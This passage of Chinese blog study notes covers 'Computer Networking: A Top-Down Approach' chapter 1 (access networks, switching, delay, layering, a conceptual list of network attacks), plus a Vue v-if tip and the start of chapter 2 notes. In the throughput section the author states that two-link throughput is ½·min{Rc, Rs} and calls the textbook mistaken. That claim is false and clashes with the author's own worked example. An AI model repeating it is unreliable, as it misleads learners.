<li>网络上行信号通道位于4kHz到50kHz频段；</li>
<li>网络下行信号通道位于50kHz到1MHz频段。</li>
</ul>
<p><strong>缺点</strong>：短距离。</p>
<h4 id="2-1-2-Cable-Internet-Access-电缆因特网接入"><a href="#2-1-2-Cable-Internet-Access-电缆因特网接入" class="headerlink" title="2.1.2. Cable Internet Access(电缆因特网接入)"></a>2.1.2. Cable Internet Access(电缆因特网接入)</h4><p><strong>用电视线作为网线</strong>。由于在这个系统中应用了光纤和同轴电缆，又被称为**混合光纤同轴(Hybrid Fiber Coax, HFC)**系统。</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC1%E7%AB%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%92%8C%E5%9B%A0%E7%89%B9%E7%BD%91/3.png" alt="1"></p>
<p>使用电缆接入因特网，需要<strong>电缆调制解调器(cable modem)<strong>，家庭PC会连接到它的以太网接口。在</strong>电缆头端(cable head end)<strong>，有一个</strong>电缆调制解调器端接系统(cable modem termination system, CMTS)<strong>，负责接收并处理各家庭传来的网络信号。在电缆中，也分为</strong>上行</strong>和<strong>下行</strong>两个信号通道。</p>
<p><strong>缺点</strong>：多个家庭共享电缆，用的人越多，网速越慢。</p>
<h4 id="2-1-3-FTTH-Fiber-To-The-Home-光纤到户"><a href="#2-1-3-FTTH-Fiber-To-The-Home-光纤到户" class="headerlink" title="2.1.3. FTTH(Fiber To The Home, 光纤到户)"></a>2.1.3. FTTH(Fiber To The Home, 光纤到户)</h4><p>根据光纤分布体系结构，可分为：</p>
<ul>
<li>**AON(active optical networks, 主动光纤网络)**，从本地中心局到每户设置一根光纤</li>
<li>**PON(passive optical networks, 被动光纤网络)**，从中心局出来的每根光纤由许多家庭共享，直到接近用户的位置，才为每个用户分配一根光纤，类似于树杈状</li>
</ul>
<p>以较为常见的PON为例，如图：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC1%E7%AB%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%92%8C%E5%9B%A0%E7%89%B9%E7%BD%91/4.png" alt="1"></p>
<p>每个家庭都有一个<strong>光纤网络端接器(optical network terminator, ONT)<strong>，用户将一台</strong>家庭路由器</strong>与ONT相连，并经过这台家庭路由器接入因特网。ONT通过专门的光纤连接到邻近的**光纤分配器(optical splitter)<strong>，该分配器把一些家庭(少于100个)集结到一根共享光纤，该光纤再连接到中心局(central office)的</strong>光纤线路端接器(optical line terminator, OLT)**。该OLT再经过中心局路由器与因特网相连。</p>
<h4 id="2-1-4-卫星与拨号"><a href="#2-1-4-卫星与拨号" class="headerlink" title="2.1.4. 卫星与拨号"></a>2.1.4. 卫星与拨号</h4><p>在一些乡村环境，常使用<strong>卫星链路</strong>或<strong>拨号接入</strong>的方式，但是网速很慢。</p>
<h4 id="2-1-5-以太网与WiFi"><a href="#2-1-5-以太网与WiFi" class="headerlink" title="2.1.5. 以太网与WiFi"></a>2.1.5. 以太网与WiFi</h4><p>在公司、大学校园以及越来越多的家庭中，也常使用**局域网(LAN)**，将端系统连接到边缘路由器。</p>
<p>有线局域网常使用<strong>以太网</strong>技术；</p>
<p>无线局域网常使用<strong>WiFi</strong>技术。</p>
<h4 id="2-1-6-3G、4G与5G"><a href="#2-1-6-3G、4G与5G" class="headerlink" title="2.1.6. 3G、4G与5G"></a>2.1.6. 3G、4G与5G</h4><p>手机等移动设备，则使用广域无线接入的方式。通过蜂窝网提供商运营的基站来发送和接收分组，用户需要位于基站的数万米范围内。</p>
<h3 id="2-2-Physical-Media-物理媒体"><a href="#2-2-Physical-Media-物理媒体" class="headerlink" title="2.2. Physical Media(物理媒体)"></a>2.2. Physical Media(物理媒体)</h3><p>分组数据所跨越的物理媒介，分为两种类型：</p>
<ul>
<li>导引型媒体：电波沿着固体媒体前行，如光纤、双绞铜线或同轴电缆</li>
<li>非导引型媒体：电波在空气或外层空间中传播，如无线局域网或卫星</li>
</ul>
<p>下面讨论几种导引型媒体：</p>
<ul>
<li><p>双绞铜线：两根绝缘铜线螺旋绞合形成双绞线(减少干扰)，许多双绞线构成一根电缆</p>
<ul>
<li>优点：便宜</li>
<li>缺点：传输速率取决于粗细和距离</li>
<li>用途：局域网、DSL、拨号</li>
</ul>
</li>
<li><p>同轴电缆：两个同心的铜导体</p>
<ul>
<li>优点：</li>
<li>缺点：共享</li>
<li>用途：电缆接入因特网</li>
</ul>
</li>
<li><p>光纤：细而柔软的、能够导引光脉冲的媒体，每个脉冲表示一个比特(bit)</p>
<ul>
<li>优点：网速高、抗干扰强</li>
<li>缺点：发送接收的光设备(接收器、交换机等)成本高</li>
<li>用途：光纤入户</li>
</ul>
</li>
</ul>
<h2 id="3-The-Network-Core-网络核心"><a href="#3-The-Network-Core-网络核心" class="headerlink" title="3. The Network Core(网络核心)"></a>3. The Network Core(网络核心)</h2><p>下图中，蓝色加粗部分即为网络核心：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC1%E7%AB%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%92%8C%E5%9B%A0%E7%89%B9%E7%BD%91/5.png" alt="1"></p>
<p>通过网络链路和交换机移动数据有两种基本方法：<strong>分组交换</strong>和<strong>电路交换</strong>。</p>
<h3 id="3-1-Packet-Switching-分组交换"><a href="#3-1-Packet-Switching-分组交换" class="headerlink" title="3.1. Packet Switching(分组交换)"></a>3.1. Packet Switching(分组交换)</h3><ul>
<li><p>**报文(message)<strong>，源端系统向目的端系统发送的完整的数据信息，如图像数据、音频数据等。在传递过程中，报文会被分解为较小的数据块，被称为</strong>分组(packet)**。</p>
</li>
<li><p><strong>存储转发传输(store-and-forward transmission)</strong> 机制，分组交换机必须接收到整个<strong>分组</strong>，才能向输出链路传输该分组的第一个比特。</p>
</li>
<li><p>**输出缓存(output buffer)**，用于存储路由器准备发往对应链路的分组，当该链路正忙于传输其它分组时，刚到达的分组必须在输出缓存中等待。</p>
</li>
<li><p>**排队时延(queuing delay)**，由于分组会遇到在输出缓存中等待的情况，所以分组传输中会存在排队时延。</p>
</li>
<li><p>**分组丢失(packet loss)**，由于缓存空间有限，当缓存已满时，将出现分组丢失的情况。</p>
</li>
<li><p>**转发表(forwarding table)**，存在于每台路由器中，用于将目的地址映射成对应的输出链路。路由器通过转发表，判断将当前分组转发到哪一条输出链路。</p>
</li>
<li><p>**路由选择协议(routing protocol)**，用于自动地设置这些转发表。例如，一个路由选择协议可以决定从每台路由器到每个目的地地最短路径，并使用这些最短路径结果来配置路由器中的转发表。</p>
</li>
</ul>
<h3 id="3-2-Circuit-Switching-电路交换"><a href="#3-2-Circuit-Switching-电路交换" class="headerlink" title="3.2. Circuit Switching(电路交换)"></a>3.2. Circuit Switching(电路交换)</h3><p>在电路交换网络中，端系统通信期间，会在沿路<strong>预留</strong>通信所需要的资源(缓存，链路传输速率)。而在分组交换网络中，这些资源是不预留的。</p>
<p>传统的<strong>电话网络</strong>就是电路交换网络的例子。在两方通话期间，第三方不能插足，因为没有多余的资源了。</p>
<p>电路交换主要通过 <strong>频分复用(frequency-division multiplexing, FDM)</strong> 或 <strong>时分复用(time-division multiplexing, TDM)</strong> 来实现。</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC1%E7%AB%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%92%8C%E5%9B%A0%E7%89%B9%E7%BD%91/6.png" alt="1"></p>
<p>如上图所示，频分复用是划分频谱，不同用户不同频段；时分复用是划分时间，不同用户不同时隙。</p>
<h3 id="3-3-Packet-Switching-vs-Circuit-Switching"><a href="#3-3-Packet-Switching-vs-Circuit-Switching" class="headerlink" title="3.3. Packet Switching vs Circuit Switching"></a>3.3. Packet Switching vs Circuit Switching</h3><ul>
<li>分组交换：<ul>
<li>优点：更好的带宽共享；更简单、有效、成本低</li>
<li>缺点：端到端的时延是可变和不可预测的</li>
</ul>
</li>
<li>电路交换：<ul>
<li>优点：稳定</li>
<li>缺点：预留端到端带宽是复杂的</li>
</ul>
</li>
</ul>
<p>分组交换胜出！</p>
<h3 id="3-4-A-Network-of-Networks-网络的网络"><a href="#3-4-A-Network-of-Networks-网络的网络" class="headerlink" title="3.4. A Network of Networks(网络的网络)"></a>3.4. A Network of Networks(网络的网络)</h3><p>年复一年，因特网用户越来越多，导致网络越来越大，从而形成了网络的网络。</p>
<p>端系统通过<strong>接入ISP</strong>进入因特网，只要所有的接入ISP互联，所有的端系统就能够彼此发送分组。那么，如何使所有的接入ISP互联呢？</p>
<p>网络的网络结构演变如下：</p>
<ul>
<li><p>一种幼稚的方法是，使每个接入ISP直接与其它每个接入ISP连接。</p>
</li>
<li><p>网络结构1，用单一的全球传输ISP互联所有接入ISP，全球ISP相当于每个接入ISP的提供商(ISP)。</p>
</li>
<li><p>网络结构2，由无数的接入ISP和多个 <strong>第一层ISP&#x2F;全球ISP(tier-1 ISP)</strong> 组成。</p>
</li>
<li><p>网络结构3，拥有多层等级ISP。例如，在中国，每个城市有接入ISP，它们与省级ISP连接，省级ISP又与国家级ISP连接，国家级ISP最终与 <strong>第一层ISP(tier-1 ISP)</strong> 连接。</p>
</li>
<li><p><strong>网络结构4</strong>，在网络结构3的基础上添加了如下内容：</p>
<ul>
<li><p>**PoP(points of presence, 存在点)**，一个PoP是提供商ISP中的一台或多台路由器(在同一位置)群组，客户ISP借此与提供商ISP连接。</p>
</li>
<li><p>**多宿(multi-home)**，任何ISP(除第一层ISP外)都可以与一个或更多个提供商ISP连接。打比方说，就是你可以同时购买电信、联通的宽带，这样一个挂了，你还可以选择另一个。</p>
</li>
<li><p>**对等(peer)**，同等级相邻的ISP能直接互联，而不通过上级ISP，这样两者之间不需要付费，也可以不用向上级ISP交钱了。比如，南京市ISP与苏州市ISP对等，就可以不用向国家ISP缴纳这部分的钱，但南京市ISP要访问深圳市ISP，依旧要向国家ISP交钱。</p>
</li>
<li><p>**IXP(Internet Exchange Point, 因特网交换点)**，是由第三方公司提供的汇合点，多个ISP可以在这里一起对等。2016的因特网中，由400多个IXP。</p>
</li>
</ul>
</li>
<li><p>网络结构5，在网络结构4的基础上添加了**内容提供商网络(content-provider networks)**，例如谷歌，它的专用网络与较低层ISP对等，并“绕过”较高层ISP。如下图：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC1%E7%AB%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%92%8C%E5%9B%A0%E7%89%B9%E7%BD%91/7.png" alt="1"></p>
</li>
</ul>
<h2 id="4-Delay-Loss-and-Throughput-in-Packet-Switched-Networks-分组交换中的延迟、丢包和吞吐量"><a href="#4-Delay-Loss-and-Throughput-in-Packet-Switched-Networks-分组交换中的延迟、丢包和吞吐量" class="headerlink" title="4. Delay, Loss, and Throughput in Packet-Switched Networks(分组交换中的延迟、丢包和吞吐量)"></a>4. Delay, Loss, and Throughput in Packet-Switched Networks(分组交换中的延迟、丢包和吞吐量)</h2><h3 id="4-1-Overview-of-Delay-in-Packet-Switched-Networks-分组交换网中的时延概述"><a href="#4-1-Overview-of-Delay-in-Packet-Switched-Networks-分组交换网中的时延概述" class="headerlink" title="4.1. Overview of Delay in Packet-Switched Networks(分组交换网中的时延概述)"></a>4.1. Overview of Delay in Packet-Switched Networks(分组交换网中的时延概述)</h3><p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC1%E7%AB%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%92%8C%E5%9B%A0%E7%89%B9%E7%BD%91/8.png" alt="1"></p>
<p>上图所示的时延分为以下四种类型：</p>
<ul>
<li><p>处理时延(Processing Delay)，路由器(分组交换机)检查分组首部和决定将该分组导向何处。在节点处理之后，路由器将该分组引向通往B链路之前的队列中。处理时延通常是微秒或更低的数量级。</p>
</li>
<li><p>排队时延(Queuing Delay)，分组在路由器中等待传输时经受的时延，取决于当前队列中分组的数量，即网络流量。排队时延可以是毫秒到微秒量级。</p>
</li>
<li><p>传输时延(Transmission Delay)，是将分组的所有比特推向链路(发射)所需要的时间。通常在毫秒到微秒量级。</p>
</li>
<li><p>传播时延(Propagation Delay)，从该链路起点到达路由器B所需要的时间。在广域网中，传播时延为毫秒量级。</p>
</li>
</ul>
<p>节点时延($d_{nodal}$) &#x3D; 处理时延($d_{proc}$) + 排队时延($d_{queue}$) + 传输时延($d_{trans}$) + 传播时延($d_{prop}$)</p>
<h3 id="4-2-Queuing-Delay-and-Packet-Loss-排队时延和丢包"><a href="#4-2-Queuing-Delay-and-Packet-Loss-排队时延和丢包" class="headerlink" title="4.2. Queuing Delay and Packet Loss(排队时延和丢包)"></a>4.2. Queuing Delay and Packet Loss(排队时延和丢包)</h3><p>节点时延中最为复杂和有趣的成分是排队时延(其实，就是<strong>堵车</strong>消耗的时间)。</p>
<ul>
<li><code>a</code>表示分组到达队列的平均速率(单位是分组&#x2F;秒，即pkt&#x2F;s)，即路由器处理该分组的速率；</li>
<li><code>R</code>表示传输速率，即从队列中推出比特的速率；</li>
<li><code>L</code>表示所有分组的平均比特长度；</li>
<li><code>La/R</code>被称为**流量强度(traffic intensity)**。</li>
</ul>
<p>如果<code>La/R&gt;1</code>，则比特到达队列的平均速率超过从该队列传输出去的速率，即接收比送出去的快。同一时刻到达的分组越多，排队时延将越大，因为$\lim_{N\to \infty}N\tfrac{La}{R} &#x3D; N$。</p>
<p>因此：</p>
<blockquote>
<p>Design your system so that the traffic intensity is no greater than 1</p>
</blockquote>
<p>当分组到达时，队列已满，那该分组奖会**丢失(loss)**。</p>
<h3 id="4-3-End-to-End-Delay-端到端时延"><a href="#4-3-End-to-End-Delay-端到端时延" class="headerlink" title="4.3. End-to-End Delay(端到端时延)"></a>4.3. End-to-End Delay(端到端时延)</h3><p>假设网络是无拥塞的（因此排队时延是微不足道的）。</p>
<p>端到端时延：$d_{end-end} &#x3D; N(d_{proc} + d_{trans} + d_{prop})$</p>
<h3 id="4-4-Throughput-in-Computer-Networks-计算机网络中的吞吐量"><a href="#4-4-Throughput-in-Computer-Networks-计算机网络中的吞吐量" class="headerlink" title="4.4. Throughput in Computer Networks(计算机网络中的吞吐量)"></a>4.4. Throughput in Computer Networks(计算机网络中的吞吐量)</h3><p>除了时延和丢包，端到端吞吐量是计算机网络中另一个至关重要的性能测度。包含如下两个度量：</p>
<ul>
<li><p>**瞬时吞吐量(instantaneous throughput)**：某一时刻的下载速率，以每秒传送的比特数bps计。比如文件下载时，不断变化的xxxkb&#x2F;s</p>
</li>
<li><p>**平均吞吐量(average throughput)**：下载完整个文件的平均速率</p>
</li>
</ul>
<p>另外，端到端的吞吐量，取决于端到端路径中速率(bps)最小的链路，即**瓶颈链路(bottleneck link)**。论证如下：</p>
<p>假设有一台服务器和一台客户机，他们通过两条通信链路和一台路由器相连，不考虑处理时延和传输时延，令$R_s$表示服务器到路由器之间的链路速率(bps)，$R_c$表示路由器到客户之间的链路速率(bps)，<strong>特别注意：链路速率(bps)表示每秒传送的比特数，而不是每秒前进的路程</strong>。如下图：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC1%E7%AB%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%92%8C%E5%9B%A0%E7%89%B9%E7%BD%91/9.png" alt="1"></p>
<p>根据$R_s$与$R_c$的比较关系，可分为以下两种情况：</p>
<ol>
<li><p>假设$R_s &lt; R_c 且 R_s&#x3D;1bit&#x2F;s, R_c&#x3D;2bit&#x2F;s$：在时刻1，有1bit从服务器到达路由器；在1s~2s间，虽然路由器到客户端的链路1s能够传播2bit，但路由器此时只有1bit，所以该链路1s只能转播1bit；在时刻2，1bit到达客户端，新的1bit又到达了路由器；重复上述步骤。虽然$R_c&#x3D;2bit&#x2F;s$，但由于服务器到路由器的链路1s只能提供1bit，所以路由器到客户端的链路速率也降至$1bit&#x2F;s$。</p>
</li>
<li><p>假设$R_s &gt; R_c 且 R_s&#x3D;2bit&#x2F;s, R_c&#x3D;1bit&#x2F;s$：在时刻1，有2bit从服务器到达路由器；在1s~2s间，由于路由器到客户端的链路1s只能够传播1bit，所以路由器还停留了1bit；在时刻2，1bit到达客户端，新的1bit又到达了路由器，此时路由器保留了2bit。随着时间推移，路由器积累的bit越来越多，这是一种最不希望的情况。</p>
</li>
</ol>
<p>因此，**对于这种简单的两链路网络，其吞吐量为$\tfrac{1}{2}min{R_c, R_s}$**（此处略不同于《计算机网络——自顶向下方法》1.4.4节中的内容，愚以为书中存在纰漏）。</p>
<p>综上所述，我们可以知道，端到端路径中的瓶颈链路，决定了端到端的吞吐量。所以，在今天因特网中，<strong>对吞吐量的限制因素通常是接入网</strong>。</p>
<p>另外，当有许多数据流通过一条链路时，一条高传输速率的链路也可能成为瓶颈链路。</p>
<h2 id="5-Protocol-Layers-and-Their-Service-Models-协议层次及其服务模型"><a href="#5-Protocol-Layers-and-Their-Service-Models-协议层次及其服务模型" class="headerlink" title="5. Protocol Layers and Their Service Models(协议层次及其服务模型)"></a>5. Protocol Layers and Their Service Models(协议层次及其服务模型)</h2><h3 id="5-1-Layered-Architecture-分层的体系结构"><a href="#5-1-Layered-Architecture-分层的体系结构" class="headerlink" title="5.1. Layered Architecture(分层的体系结构)"></a>5.1. Layered Architecture(分层的体系结构)</h3><p><strong>分层</strong>是分析和设计大型系统的良好方法。</p>
<h4 id="5-1-1-Protocol-Layering-协议分层"><a href="#5-1-1-Protocol-Layering-协议分层" class="headerlink" title="5.1.1. Protocol Layering(协议分层)"></a>5.1.1. Protocol Layering(协议分层)</h4><p>5层因特网<strong>协议栈(protocol stack, 各层的所有协议)</strong> 如下图：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC1%E7%AB%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%92%8C%E5%9B%A0%E7%89%B9%E7%BD%91/10.png" alt="1"></p>
<p>上层服务依赖于下层服务，下层服务为上层服务提供接口。</p>
<p>就像本书所说，我们采用 <strong>自顶向下方法(top-down approach)</strong> 进行解释分析：</p>
<ul>
<li>**应用层(Application)<strong>，软件实现。包含HTTP、SMTP、FTP、DNS等协议，应用层中的基本信息称为</strong>报文(message)**。</li>
<li>**运输层(Transport)<strong>，软件实现。包含TCP、UDP等协议，运输层中的基本信息称为</strong>报文段(segment)**。</li>
<li>**网络层(Network)<strong>，软硬件实现。包含IP、路由选择等协议，基本信息称为</strong>数据报(datagram)**。</li>
<li>**链路层(Link)<strong>，硬件实现。包含以太网、WiFi等协议，基本信息称为</strong>帧(frame)**。</li>
<li>**物理层(Physical)<strong>，硬件实现。包含关于双绞铜线、光纤等链路的协议，基本信息为</strong>比特(bit)**。</li>
</ul>
<h4 id="5-1-2-The-OSI-Model-OSI模型"><a href="#5-1-2-The-OSI-Model-OSI模型" class="headerlink" title="5.1.2. The OSI Model(OSI模型)"></a>5.1.2. The OSI Model(OSI模型)</h4><p>1970s后期，国际标准化组织(ISO)提出计算机网络围绕7层来组织，称为开发系统互连模型(OSI模型)，如下：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC1%E7%AB%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%92%8C%E5%9B%A0%E7%89%B9%E7%BD%91/11.png" alt="1"></p>
<p>相比于因特网5层模型，7层模型多了 <strong>表示层(Presentation)</strong> 和 <strong>会话层(Session)</strong> 两层。</p>
<p>为什么会少了两层呢？因特网回答如下：</p>
<blockquote>
<p>it’s up to the application developer.</p>
</blockquote>
<p>这交给开发者处理。</p>
<h3 id="5-2-Encapsulation-封装"><a href="#5-2-Encapsulation-封装" class="headerlink" title="5.2. Encapsulation(封装)"></a>5.2. Encapsulation(封装)</h3><p>封装的意义：对于上一层传来的数据信息，附加上当前层的附加信息。</p>
<p>对于每一层的数据信息，具有两种类型的字段：<strong>首部字段(当前层信息)</strong> 和 **有效载荷字段(payload field, 来自上一层)**。</p>
<h2 id="6-Networks-Under-Attack-面对攻击网络"><a href="#6-Networks-Under-Attack-面对攻击网络" class="headerlink" title="6. Networks Under Attack(面对攻击网络)"></a>6. Networks Under Attack(面对攻击网络)</h2><ul>
<li>**僵尸网络(botnet)**，被黑客入侵设备组成的网络。</li>
<li>**病毒(virus)**，一种需要某种形式的用户交互来感染用户设备的恶意软件。</li>
<li>**蠕虫(worm)**，一种无须任何明显用户交互就能进入设备的恶意软件。</li>
<li>**DoS(denial-of-service attacks, 拒绝服务攻击)**：<ul>
<li>弱点攻击。攻击目标主机上运行的应用程序，从而使主机崩溃或者控制主机。这不是<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/readme-zh/">pwn</a>吗！</li>
<li>带宽洪泛。攻击者向目标主机发送大量分组，使其接入链路拥塞。</li>
<li>连接洪泛。攻击者在目标主机中创建大量的半开或全开的TCP连接。</li>
</ul>
</li>
<li>**DDoS(distributed DoS, 分布式DoS)**，黑客利用受害主机组成的僵尸网络对服务器进行攻击：<br><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC1%E7%AB%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%92%8C%E5%9B%A0%E7%89%B9%E7%BD%91/12.png" alt="1"></li>
<li>**分组嗅探器(packet sniffer)**，记录每个流经的分组副本的被动接收机。在无线传输设备的附近放置一台被动的接收机，它就能得到传输的每个分组的副本。分组嗅探软件——Wireshark。</li>
</ul>
<p>等等等等。</p>
<h2 id="7-History-of-Computer-Networking-and-the-Internet"><a href="#7-History-of-Computer-Networking-and-the-Internet" class="headerlink" title="7. History of Computer Networking and the Internet"></a>7. History of Computer Networking and the Internet</h2><ul>
<li>1960s，电话网络统治着通信网络，它主要采用电路交换的方式发送信息。</li>
<li>1960s，MIT(麻省理工)的研究生Leonard Kleinrock、兰德公司和NPL(英国国家物理实验室)分别研究并发明了分组交换技术。</li>
<li>1967年左右，Lawrence Roberts(Leonard Kleinrock的同事)公布了一个<strong>ARPAnet</strong>(ARPA，美国高级研究计划署)的总体计划，它是第一个分组交换计算机网络，是因特网的祖先。</li>
<li>1969年，第一个分组交换网络<strong>ARPAnet</strong>落地，但只有4个节点。</li>
<li>1972年，ARPAnet发展到15个节点，并完成了第一个端到端协议——<strong>NCP</strong>。</li>
<li>1970s早中期，其它分组交换网络问世，包括：ALOHAnet(无线电网络)、Telenet(BBN的商用分组交换网路)等，还有分时网络：Tymnet和GE信息服务网。</li>
<li>1970s，将各网络互联的工作得到了DARPA(美国国防部高级研究计划署)的支持。</li>
<li>1976年， Metcalfe 和 Boggs 基于ALOHAnet中的多路访问协议，研制了<strong>以太网协议</strong>。</li>
<li>1970s末，TCP、UDP、IP协议在概念上已经完成。</li>
<li>1979年，ARPAnet拥有200个节点。</li>
<li>1982年，<strong>SMTP</strong>邮件协议被发明。</li>
<li>1983年1月1日，<strong>TCP&#x2F;IP协议</strong>替代了NCP协议，成为ARPAnet新的标准主机协议。</li>
<li>1983年，发明了<strong>DNS</strong>协议。</li>
<li>1985年，发明了<strong>FTP</strong>协议。</li>
<li>1980s初期，在ARPAnet发展的同时，法国启动了<strong>Minitel</strong>项目，他的计划是让数据网络进入每个家庭。在1990s中期，Minitel提供了20000多种服务，涵盖了广泛的范围。Minitel在大量法国家庭中存在了10年后，大多数美国人才听说因特网。</li>
<li>1980s，BITNET为美国东北部的几个大学之间提供电子邮件和文件传输。然后，建立了CSNET将没有接入ARPAnet的大学研究人员连接到一起。1986年，又建立了NSFNET。</li>
<li>1980s末期，连到公共因特网的主机数量达到1000000台。</li>
<li>1990s，ARPAnet已不复存在，NSFNET也于1995年退役，因特网步入商业化。</li>
<li>1989~1991年间，Tim Berners-Lee发明了<strong>Web</strong>，并和他的同事研制了HTML、HTTP、Web服务器和浏览器，这是Web的4个关键部分。</li>
<li>1995~2000，因特网飞速发展。</li>
<li>2000~2001，因特网股票崩盘，许多因特网初创公司倒闭。</li>
<li>2000至今，因特网家庭接入、速度越来越快、大公司部署专用网络、“云”。</li>
</ul>
]]></content>
      <categories>
        <category>九层之台，起于累土</category>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>vue先加载数据再渲染</title>
    <url>/vue%E5%85%88%E5%8A%A0%E8%BD%BD%E6%95%B0%E6%8D%AE%E5%86%8D%E6%B8%B2%E6%9F%93.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>vue 使用中 bug 记录。</p>
<p>版本：<code>vue 3.0</code></p>
<p>由于 JavaScript 中请求通常是异步，因此几乎无法实现先加载数据再渲染页面。</p>
<p>但是，我们可以用 <code>v-if</code> 判断数据是否已加载，来实现加载完数据再渲染的效果。</p>
<span id="more"></span>

<h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p>比如，有如下数据，需要请求后端获取：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">paper</span>: &#123;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="示例一"><a href="#示例一" class="headerlink" title="示例一"></a>示例一</h3><p>在页面中，我们可能如此使用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;&#123;&#123; paper.venue.name &#125;&#125;&lt;/p&gt;</span><br></pre></td></tr></table></figure>

<p>由于渲染通常快于数据请求，则可能报如下错误：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TypeError: Cannot read property &#x27;_key&#x27; of undefined</span><br></pre></td></tr></table></figure>

<p>不过可能无伤大雅（页面最终能展现）。</p>
<h3 id="示例二"><a href="#示例二" class="headerlink" title="示例二"></a>示例二</h3><p>但如果如此使用（传入组件）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;router-link :to=&quot;&#123; path: &#x27;/&#x27; &#125;&quot;&gt;&#123;&#123; paper.venue.name &#125;&#125;&lt;/router-link&gt;</span><br></pre></td></tr></table></figure>

<p>则可能报如下错误，甚至页面无法显示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TypeError: Cannot read property &#x27;parentNode&#x27; of null</span><br></pre></td></tr></table></figure>

<h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><p>直接使用 <code>v-if</code> 全部解决：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;p v-if=&quot;paper.venue&quot;&gt;&#123;&#123; paper.venue.name &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;router-link v-if=&quot;paper.venue&quot; :to=&quot;&#123; path: &#x27;/&#x27; &#125;&quot;&gt;&#123;&#123; paper.venue.name &#125;&#125;&lt;/router-link&gt;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>开发</category>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>《计算机网络》笔记-第2章应用层</title>
    <url>/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC2%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%82.html</url>
    <content><![CDATA[<p>[TOC]</p>
<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><blockquote>
<p>Chapter 2 Application Layer</p>
</blockquote>
<p>《计算机网络——自顶向下方法》第2章的学习笔记。笔记中，部分标题经过我修改，跟书本不一致。</p>
<p>应用层是相对贴近于我们的一层，也是相对简单的一层。</p>
<p>正如其名，它是为了处理<strong>应用 application 之间通信</strong>而存在的，比如：浏览器应用如何从云端服务器应用中获取资源（我们需要知道资源的位置、资源的数据格式、服务器的状态等）；邮箱应用如何将邮件发送给另一个邮箱应用；QQ应用如何与另一个QQ应用通信等等。</p>
<span id="more"></span>

